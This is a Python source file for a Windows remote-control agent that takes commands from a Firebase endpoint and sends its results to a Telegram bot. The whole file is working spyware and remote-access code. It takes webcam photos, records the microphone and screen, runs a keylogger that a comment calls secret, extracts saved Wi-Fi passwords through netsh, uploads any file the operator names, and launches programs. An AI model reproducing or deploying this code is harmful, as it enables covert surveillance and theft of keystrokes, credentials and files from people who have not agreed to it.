import os
import time
import ctypes
import webbrowser
import threading
import subprocess
import requests
import psutil
import pyttsx3
from PIL import ImageGrab
from dotenv import load_dotenv
import cv2
import numpy as np
import sounddevice as sd
import wave
from pynput import keyboard as pynput_keyboard

load_dotenv()

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
FIREBASE_URL = os.environ.get("FIREBASE_URL", "").rstrip("/")

def send_telegram_message(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}, timeout=10)
    except Exception as e:
        print("[-] Telegram mesaji gonderile bilmedi:", e)

def send_telegram_photo(chat_id, photo_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(photo_path, "rb") as photo:
            requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": photo}, timeout=20)
    except Exception as e:
        print("[-] Telegram sekli gonderile bilmedi:", e)

def send_telegram_voice(chat_id, audio_path, caption=""):
    """Telegram-a ses faylini voice mesaj kimi gonderir."""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendVoice"
        with open(audio_path, "rb") as audio:
            requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"voice": audio}, timeout=30)
    except Exception as e:
        print("[-] Telegram ses gonderile bilmedi:", e)

def send_telegram_document(chat_id, file_path, caption=""):
    """Telegram-a fayl kimi gonderir (audio/document)."""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        # caption-u ASCII-safe saxlayiriq ki, surrogate encoding xetasi olmasin
        safe_caption = caption.encode("utf-8", errors="replace").decode("utf-8")
        with open(file_path, "rb") as f:
            requests.post(
                url,
                data={"chat_id": str(chat_id), "caption": safe_caption},
                files={"document": f},
                timeout=60
            )
    except Exception as e:
        print("[-] Telegram dokument gonderile bilmedi:", e)

def send_telegram_video(chat_id, video_path, caption=""):
    """Telegram-a video kimi gonderir (oynadir)."""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
        safe_caption = caption.encode("utf-8", errors="replace").decode("utf-8")
        with open(video_path, "rb") as f:
            requests.post(
                url,
                data={"chat_id": str(chat_id), "caption": safe_caption, "supports_streaming": "true"},
                files={"video": f},
                timeout=120
            )
    except Exception as e:
        print("[-] Telegram video gonderile bilmedi:", e)

# ============================================================
# WEBCAM - Veb-kamera fotosu
# ============================================================
def capture_webcam(chat_id):
    """Noutbukun on kamerasini acib anlik sekil cekir ve Telegram-a gonderir."""
    path = "webcam_capture.jpg"
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            send_telegram_message(chat_id, "⚠️ Veb-kamera tapilmadi ve ya acila bilmedi.")
            return

        # Kameraya issinmaq ucun bir nece frame oxuyuruq
        for _ in range(5):
            cap.read()
            time.sleep(0.1)

        ret, frame = cap.read()
        cap.release()

        if ret and frame is not None:
            cv2.imwrite(path, frame)
            send_telegram_photo(chat_id, path, "📷 Veb-kamera goruntusu")
            print("[+] Webcam sekli ugurla gonderildi")
        else:
            send_telegram_message(chat_id, "⚠️ Veb-kameradan sekil alina bilmedi.")

    except Exception as e:
        print("[-] Webcam xetasi:", e)
        send_telegram_message(chat_id, f"❌ Veb-kamera xetasi: {e}")
    finally:
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass

# ============================================================
# MICROPHONE - Etraf ses yazisi
# ============================================================
def record_microphone(chat_id, duration=10):
    """Noutbukun mikrofonunu mueyyen muddet isledir ve ses yazisini Telegram-a gonderir."""
    path = "mic_recording.wav"
    try:
        sample_rate = 44100
        channels = 1

        send_telegram_message(chat_id, f"🎙️ Mikrofon {duration} saniye yazir...")
        print(f"[+] Mikrofon yazisi baslanir: {duration} saniye")

        # Sesi yazirig
        recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=channels, dtype='int16')
        sd.wait()  # Yazinin bitmesin gozle

        # WAV faylina yaziriq
        with wave.open(path, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)  # 16-bit = 2 bytes
            wf.setframerate(sample_rate)
            wf.writeframes(recording.tobytes())

        print("[+] Ses yazildi, gonderilir...")
        send_telegram_document(chat_id, path, f"🎤 Etraf sesi ({duration} san.)")
        print("[+] Ses fayli ugurla gonderildi")

    except Exception as e:
        print("[-] Mikrofon xetasi:", e)
        send_telegram_message(chat_id, f"❌ Mikrofon xetasi: {e}")
    finally:
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass

# ============================================================
# LOCATION - Xarici IP ve Mekan
# ============================================================
def get_location(chat_id):
    """Noutbukun xarici IP-sini ve texmini geolokasiyanisi gosterir."""
    try:
        res = requests.get("http://ip-api.com/json/?lang=en", timeout=10)
        data = res.json()

        if data.get("status") == "success":
            msg = (
                "📍 <b>Mekan ve IP melumati</b>\n\n"
                f"🌐 Xarici IP: <code>{data.get('query', '?')}</code>\n"
                f"🏙️ Seher: {data.get('city', '?')}\n"
                f"🗺️ Region: {data.get('regionName', '?')}\n"
                f"🇦🇿 Olke: {data.get('country', '?')}\n"
                f"🏢 ISP: {data.get('isp', '?')}\n"
                f"📡 Timezone: {data.get('timezone', '?')}\n"
                f"📌 Koordinatlar: {data.get('lat', '?')}, {data.get('lon', '?')}"
            )
        else:
            msg = "⚠️ Mekan melumati alina bilmedi."

        send_telegram_message(chat_id, msg)
        print("[+] Location melumati gonderildi")

    except Exception as e:
        print("[-] Location xetasi:", e)
        send_telegram_message(chat_id, f"❌ Mekan xetasi: {e}")

# ============================================================
# MEDIA CONTROL - Play/Pause/Next/Prev
# ============================================================
VK_MEDIA_PLAY_PAUSE = 0xB3
VK_MEDIA_NEXT_TRACK = 0xB0
VK_MEDIA_PREV_TRACK = 0xB1

def press_media_key(vk_code):
    """Windows media klavish duymesini simulyasiya edir."""
    KEYEVENTF_EXTENDEDKEY = 0x0001
    KEYEVENTF_KEYUP = 0x0002
    ctypes.windll.user32.keybd_event(vk_code, 0, KEYEVENTF_EXTENDEDKEY, 0)
    ctypes.windll.user32.keybd_event(vk_code, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0)

def media_play_pause(chat_id):
    press_media_key(VK_MEDIA_PLAY_PAUSE)
    send_telegram_message(chat_id, "⏯️ Play/Pause basıldi.")
    print("[+] Media Play/Pause")

def media_next(chat_id):
    press_media_key(VK_MEDIA_NEXT_TRACK)
    send_telegram_message(chat_id, "⏭️ Novbeti mahni.")
    print("[+] Media Next")

def media_prev(chat_id):
    press_media_key(VK_MEDIA_PREV_TRACK)
    send_telegram_message(chat_id, "⏮️ Evvelki mahni.")
    print("[+] Media Prev")

# ============================================================
# SAY - Text-to-Speech (Sesle danisdirmaq)
# ============================================================
def say_text(chat_id, text):
    """Verilmis metni noutbukun dinamikinden robot sesile oxuyur."""
    try:
        if not text.strip():
            send_telegram_message(chat_id, "⚠️ Metn yaz: /say Salam Mursel")
            return

        engine = pyttsx3.init()
        engine.setProperty('rate', 150)     # Suretle danismaq suretini teyin edirik
        engine.setProperty('volume', 1.0)   # Maksimum ses
        engine.say(text)
        engine.runAndWait()
        engine.stop()

        send_telegram_message(chat_id, f"🔊 Sesle deyildi: \"{text}\"")
        print(f"[+] TTS: {text}")

    except Exception as e:
        print("[-] TTS xetasi:", e)
        send_telegram_message(chat_id, f"❌ Sesle danisilmadi: {e}")

# ============================================================
# OPEN - Sayt ve ya proqram acmaq
# ============================================================
def open_url_or_program(chat_id, target):
    """Noutbukda link ve ya proqram acir."""
    try:
        if not target.strip():
            send_telegram_message(chat_id, "⚠️ Link yaz: /open https://youtube.com")
            return

        # Eger URL kimi gorunurse brauzerde ac, yoxsa proqram kimi ac
        if target.startswith("http://") or target.startswith("https://"):
            webbrowser.open(target)
            send_telegram_message(chat_id, f"🌐 Brauzer acildi: {target}")
        else:
            os.startfile(target)
            send_telegram_message(chat_id, f"📂 Acildi: {target}")

        print(f"[+] Acildi: {target}")

    except Exception as e:
        print("[-] Open xetasi:", e)
        send_telegram_message(chat_id, f"❌ Acila bilmedi: {e}")

# ============================================================
# MSG - Ekrana popup mesaj cixarmaq
# ============================================================
def show_popup_message(chat_id, text):
    """Noutbukun ekraninda boyuk xeberdarliq penceresi (popup) acir."""
    try:
        if not text.strip():
            send_telegram_message(chat_id, "⚠️ Metn yaz: /msg Komputere toxunma!")
            return

        # Popup-u ayri thread-de acirig ki, agent bloklanmasin
        def _show():
            ctypes.windll.user32.MessageBoxW(
                0,
                text,
                "RemoteHub Xeberdarliq",
                0x00000040 | 0x00010000  # MB_ICONINFORMATION | MB_SETFOREGROUND
            )

        t = threading.Thread(target=_show, daemon=True)
        t.start()

        send_telegram_message(chat_id, f"💬 Ekrana mesaj cixarildi: \"{text}\"")
        print(f"[+] Popup gosterildi: {text}")

    except Exception as e:
        print("[-] Popup xetasi:", e)
        send_telegram_message(chat_id, f"❌ Popup xetasi: {e}")

# ============================================================
# WIFI - Yaddasdaki Wi-Fi sifreleri
# ============================================================
def get_wifi_passwords(chat_id):
    """Noutbukun indiye qeder qosuldugu Wi-Fi sebekelerinin adlarini ve sifrelerini cixarir."""
    try:
        # Butun profilleri al
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=10, encoding="cp866"
        )

        lines = result.stdout.split("\n")
        profiles = []
        for line in lines:
            if "All User Profile" in line or "Tüm Kullanıcı Profili" in line or "User Profile" in line:
                # "    All User Profile     : MyWiFi" -> "MyWiFi"
                name = line.split(":")[-1].strip()
                if name:
                    profiles.append(name)

        if not profiles:
            send_telegram_message(chat_id, "📶 Heç bir Wi-Fi profili tapılmadı.")
            return

        wifi_list = []
        for profile in profiles:
            try:
                detail = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                    capture_output=True, text=True, timeout=10, encoding="cp866"
                )
                password = ""
                for dline in detail.stdout.split("\n"):
                    if "Key Content" in dline or "Anahtar İçeriği" in dline:
                        password = dline.split(":")[-1].strip()
                        break

                if password:
                    wifi_list.append(f"📶 <b>{profile}</b>\n🔑 {password}")
                else:
                    wifi_list.append(f"📶 <b>{profile}</b>\n🔑 (sifre yoxdur / aciq)")
            except Exception:
                wifi_list.append(f"📶 <b>{profile}</b>\n🔑 (oxuna bilmedi)")

        msg = "🔐 <b>Wi-Fi Sifreleri</b>\n\n" + "\n\n".join(wifi_list)

        # Telegram mesaj limiti 4096 simvol
        if len(msg) > 4000:
            parts = []
            current = "🔐 <b>Wi-Fi Sifreleri</b>\n\n"
            for item in wifi_list:
                if len(current) + len(item) + 2 > 4000:
                    parts.append(current)
                    current = ""
                current += item + "\n\n"
            if current:
                parts.append(current)
            for part in parts:
                send_telegram_message(chat_id, part)
        else:
            send_telegram_message(chat_id, msg)

        print(f"[+] Wi-Fi sifreleri gonderildi ({len(profiles)} profil)")

    except Exception as e:
        print("[-] Wi-Fi xetasi:", e)
        send_telegram_message(chat_id, f"❌ Wi-Fi sifreleri alina bilmedi: {e}")

# ============================================================
# BATTERY MONITOR - Avtomatik batareya siqnali
# ============================================================
BATTERY_ALERT_CHAT_ID = 6426820534  # Bildirisleri gondereceyimiz chat

def battery_monitor():
    """Arxa planda batareyanin veziyyetini yoxlayir ve kritik hallarda Telegram-a bildiris gonderir."""
    alerted_low = False
    alerted_full = False

    while True:
        try:
            battery = psutil.sensors_battery()
            if battery:
                percent = battery.percent
                plugged = battery.power_plugged

                # Batareya 20%-den asagi dusende (ve sarjda deyilse)
                if percent <= 20 and not plugged and not alerted_low:
                    send_telegram_message(
                        BATTERY_ALERT_CHAT_ID,
                        f"🪫 <b>Batareya azdir!</b>\n\n🔋 {percent}%\n⚡ Sarj qosulmayib!\nNoutbuku sarj et!"
                    )
                    alerted_low = True
                    print(f"[!] Batareya az siqnali gonderildi: {percent}%")

                elif percent > 25:
                    alerted_low = False

                # Batareya 100% dolanda (ve sarjdadirsa)
                if percent >= 100 and plugged and not alerted_full:
                    send_telegram_message(
                        BATTERY_ALERT_CHAT_ID,
                        "🔋 <b>Batareya tam doldu!</b>\n\n✅ 100%\n🔌 Sarjdan cixar!"
                    )
                    alerted_full = True
                    print("[!] Batareya dolu siqnali gonderildi")

                elif percent < 98:
                    alerted_full = False

        except Exception as e:
            print("[-] Battery monitor xetasi:", e)

        time.sleep(60)  # Her 1 deqiqede bir yoxla

# ============================================================
# KEYLOGGER - Klaviatura yazisi
# ============================================================
keylog_data = []
keylog_listener = None
keylog_active = False

def start_keylogger(chat_id):
    """Klaviaturada yazilan her seyi gizlice qeyd etmeye baslayir."""
    global keylog_listener, keylog_active, keylog_data
    if keylog_active:
        send_telegram_message(chat_id, "\u26a0\ufe0f Keylogger artiq isleyir! Dayandirmaq ucun /keylog stop")
        return

    keylog_data = []
    keylog_active = True

    def on_press(key):
        try:
            keylog_data.append(key.char)
        except AttributeError:
            special = key.name
            if special == "space":
                keylog_data.append(" ")
            elif special == "enter":
                keylog_data.append("\n")
            elif special == "backspace":
                keylog_data.append("[BS]")
            else:
                keylog_data.append(f"[{special}]")

    keylog_listener = pynput_keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    send_telegram_message(chat_id, "\ud83d\udd34 Keylogger basladi! Dayandirmaq ucun /keylog stop")
    print("[+] Keylogger basladi")

def stop_keylogger(chat_id):
    """Keyloggeri dayandirb yazilanlari txt fayli kimi Telegram-a gonderir."""
    global keylog_listener, keylog_active, keylog_data
    if not keylog_active:
        send_telegram_message(chat_id, "\u26a0\ufe0f Keylogger islemir. Baslatmaq ucun /keylog start")
        return

    keylog_listener.stop()
    keylog_active = False

    path = "keylog_output.txt"
    try:
        text = "".join(keylog_data)
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)

        if text.strip():
            send_telegram_document(chat_id, path, f"\u2328\ufe0f Keylog yazilari ({len(text)} simvol)")
        else:
            send_telegram_message(chat_id, "\ud83d\udcdd Keylogger dayandi, amma hec ne yazilmayib.")

        print(f"[+] Keylogger dayandi, {len(text)} simvol gonderildi")
    except Exception as e:
        print("[-] Keylog save xetasi:", e)
        send_telegram_message(chat_id, f"\u274c Keylog saxlana bilmedi: {e}")
    finally:
        keylog_data = []
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass

# ============================================================
# DOWNLOAD - Faylli noutbukdan Telegram-a gonder
# ============================================================
def download_file(chat_id, file_path):
    """Noutbukdaki istenen faylı Telegram-a gonderir."""
    try:
        if not file_path.strip():
            send_telegram_message(chat_id, "\u26a0\ufe0f Fayl yolu yaz: /download C:\\Users\\...\\file.pdf")
            return

        if not os.path.exists(file_path):
            send_telegram_message(chat_id, f"\u26a0\ufe0f Fayl tapilmadi: {file_path}")
            return

        if not os.path.isfile(file_path):
            send_telegram_message(chat_id, f"\u26a0\ufe0f Bu qovluqdur, fayl deyil: {file_path}")
            return

        size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if size_mb > 50:
            send_telegram_message(chat_id, f"\u26a0\ufe0f Fayl cox boyukdur: {size_mb:.1f} MB (Telegram limiti: 50 MB)")
            return

        send_telegram_document(chat_id, file_path, f"\ud83d\udcc2 {os.path.basename(file_path)} ({size_mb:.1f} MB)")
        print(f"[+] Fayl gonderildi: {file_path}")

    except Exception as e:
        print("[-] Download xetasi:", e)
        send_telegram_message(chat_id, f"\u274c Fayl gonderile bilmedi: {e}")

# ============================================================
# SCREEN RECORD - Ekran videoyazisi
# ============================================================
def record_screen(chat_id, duration=15):
    """Ekrani mueyyen muddet video kimi yazib Telegram-a gonderir."""
    path = "screen_record.avi"
    try:
        duration = max(3, min(duration, 30))  # 3-30 saniye arasi
        send_telegram_message(chat_id, f"\ud83c\udfa5 Ekran {duration} saniye yazilir...")
        print(f"[+] Ekran yazisi baslanir: {duration} saniye")

        # Ekran olcusunu al
        screen = ImageGrab.grab()
        width, height = screen.size

        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        fps = 8
        out = cv2.VideoWriter(path, fourcc, fps, (width, height))

        start_time = time.time()
        frame_interval = 1.0 / fps

        while time.time() - start_time < duration:
            frame_start = time.time()
            img = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            elapsed = time.time() - frame_start
            if elapsed < frame_interval:
                time.sleep(frame_interval - elapsed)

        out.release()

        if os.path.exists(path) and os.path.getsize(path) > 0:
            # AVI-ni Telegram native video kimi gonderek (oynadir)
            send_telegram_video(chat_id, path, f"Screen record ({duration} san.)")
            print("[+] Ekran yazisi ugurla gonderildi")
        else:
            send_telegram_message(chat_id, "Ekran yazisi bos alindi.")

    except Exception as e:
        print("[-] Screen record xetasi:", e)
        send_telegram_message(chat_id, f"\u274c Ekran yazisi alina bilmedi: {e}")
    finally:
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass

# ============================================================
# EXECUTE COMMAND
# ============================================================
def execute_command(action, chat_id):
    print(f"[+] Emr icra olunur: {action}")
    try:
        if action == "status":
            cpu = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage("/")
            battery = psutil.sensors_battery()
            bat_stat = f"🔋 {battery.percent}%" if battery else "Melumat yoxdur"
            
            msg = (
                "🟢 <b>Laptop ONLINE</b>\n"
                f"🧠 CPU: {cpu}%\n"
                f"💾 RAM: {memory.percent}%\n"
                f"💿 Disk: {disk.percent}%\n"
                f"Batareya: {bat_stat}"
            )
            send_telegram_message(chat_id, msg)

        elif action == "battery":
            battery = psutil.sensors_battery()
            if battery:
                status = "🔌 Sarj olunur" if battery.power_plugged else "🔋 Batareyada"
                msg = f"🔋 <b>Batareya</b>\nFaiz: {battery.percent}%\nVeziyyet: {status}"
            else:
                msg = "Batareya melumati yoxdur."
            send_telegram_message(chat_id, msg)

        elif action == "screenshot":
            path = "screenshot_agent.png"
            try:
                img = ImageGrab.grab()
                img.save(path)
                send_telegram_photo(chat_id, path, "🖥️ Laptop ekran goruntusu")
                print("[+] Screenshot ugurla gonderildi")
            except Exception as grab_err:
                print("[-] Screenshot cekile bilmedi:", grab_err)
                send_telegram_message(
                    chat_id,
                    f"⚠️ Ekran goruntusu alina bilmedi: {grab_err}\n(Eger ekran kilidlidirse ve ya sonuludurse, Windows goruntuye icaze vermir)"
                )
            finally:
                if os.path.exists(path):
                    try:
                        os.remove(path)
                    except Exception:
                        pass

        elif action == "webcam":
            capture_webcam(chat_id)

        elif action.startswith("mic"):
            # /mic 10  -> action = "mic 10", default 10 saniye
            parts = action.split()
            duration = 10  # default
            if len(parts) > 1:
                try:
                    duration = int(parts[1])
                    duration = max(3, min(duration, 60))  # 3-60 saniye arasi
                except ValueError:
                    duration = 10
            record_microphone(chat_id, duration)

        elif action == "listen":
            record_microphone(chat_id, 10)

        elif action == "location":
            get_location(chat_id)

        elif action == "play" or action == "pause":
            media_play_pause(chat_id)

        elif action == "next":
            media_next(chat_id)

        elif action == "prev":
            media_prev(chat_id)

        elif action == "say" or action.startswith("say "):
            text = action[4:] if len(action) > 4 else ""
            say_text(chat_id, text)

        elif action == "open" or action.startswith("open "):
            target = action[5:] if len(action) > 5 else ""
            open_url_or_program(chat_id, target)

        elif action == "msg" or action.startswith("msg "):
            text = action[4:] if len(action) > 4 else ""
            show_popup_message(chat_id, text)

        elif action == "wifi":
            get_wifi_passwords(chat_id)

        elif action == "keylog start":
            start_keylogger(chat_id)

        elif action == "keylog stop":
            stop_keylogger(chat_id)

        elif action == "keylog" or action.startswith("keylog "):
            arg = action[7:].strip() if len(action) > 7 else ""
            if arg == "start":
                start_keylogger(chat_id)
            elif arg == "stop":
                stop_keylogger(chat_id)
            else:
                send_telegram_message(chat_id, "\u26a0\ufe0f Istifade: /keylog start ve ya /keylog stop")

        elif action == "download" or action.startswith("download "):
            file_path = action[9:] if len(action) > 9 else ""
            download_file(chat_id, file_path)

        elif action == "record" or action.startswith("record "):
            parts = action.split()
            duration = 15  # default
            if len(parts) > 1:
                try:
                    duration = int(parts[1])
                except ValueError:
                    duration = 15
            record_screen(chat_id, duration)

        elif action == "lock":
            os.system("rundll32.exe user32.dll,LockWorkStation")
            send_telegram_message(chat_id, "\ud83d\udd12 Laptop kilidlandi.")

        elif action == "shutdown":
            os.system("shutdown /s /t 60")
            send_telegram_message(chat_id, "\u26a0\ufe0f Komputer 60 saniyeye sonecek. Legv etmek ucun /cancel_shutdown")

        elif action == "cancel_shutdown":
            os.system("shutdown /a")
            send_telegram_message(chat_id, "\u2705 Sondurulme legv edildi.")
            
        elif action == "restart":
            os.system("shutdown /r /t 60")
            send_telegram_message(chat_id, "\u26a0\ufe0f Komputer 60 saniyeye yeniden baslayacaq.")

        else:
            print(f"[-] Namelum emr: {action}")
            
    except Exception as e:
        print(f"[-] Emr icrasinda xeta: {e}")
        send_telegram_message(chat_id, f"❌ Xeta bas verdi: {str(e)}")

def listen_to_firebase():
    url = f"{FIREBASE_URL}/pc_command.json"
    print(f"[+] PC Agent ise dusdu ve Firebase-i dinleyir... {url}")
    
    while True:
        try:
            res = requests.get(url, timeout=5)
            if res.status_code == 200:
                data = res.json()
                if data and isinstance(data, dict) and "action" in data:
                    print("[+] Firebase-den emr geldi:", data)
                    action = data.get("action")
                    chat_id = data.get("chat_id")
                    
                    # Emri derhal Firebase-den silirik ki, yeniden icra olunmasin
                    try:
                        requests.delete(url, timeout=5)
                    except Exception as del_err:
                        print("[-] Emr silinende xeta:", del_err)
                    
                    execute_command(action, chat_id)
        except Exception as e:
            print("[-] Dinleme xetasi, 2 saniye sonra yeniden yoxlanir:", e)
            time.sleep(2)
        
        time.sleep(1)

if __name__ == "__main__":
    try:
        # Kohne qalmis emrleri temizleyirik
        requests.delete(f"{FIREBASE_URL}/pc_command.json", timeout=5)
    except Exception:
        pass

    # ── Baslanğıc bildirişi ──────────────────────────────────
    def send_startup_notification():
        try:
            from datetime import datetime
            now = datetime.now().strftime("%d.%m.%Y %H:%M:%S")

            battery = psutil.sensors_battery()
            bat_info = (
                f"🔋 {battery.percent:.0f}% ({'sarjda' if battery.power_plugged else 'batareyada'})"
                if battery else "Batareya melumati yoxdur"
            )

            try:
                geo = requests.get("http://ip-api.com/json/?lang=en", timeout=5).json()
                ip_info = f"🌐 {geo.get('query','?')} — {geo.get('city','?')}, {geo.get('country','?')}"
            except Exception:
                ip_info = "IP alina bilmedi"

            msg = (
                "🟢 <b>Laptop Yandi!</b>\n\n"
                f"🕐 Vaxt: {now}\n"
                f"{bat_info}\n"
                f"{ip_info}"
            )
            send_telegram_message(BATTERY_ALERT_CHAT_ID, msg)
            print("[+] Baslangic bildirisi gonderildi")
        except Exception as e:
            print("[-] Baslangic bildirisi xetasi:", e)

    send_startup_notification()

    # Batareya monitorunu arxa planda baslat
    battery_thread = threading.Thread(target=battery_monitor, daemon=True)
    battery_thread.start()
    print("[+] Batareya monitoru isledi (arxa plan)")

    listen_to_firebase()
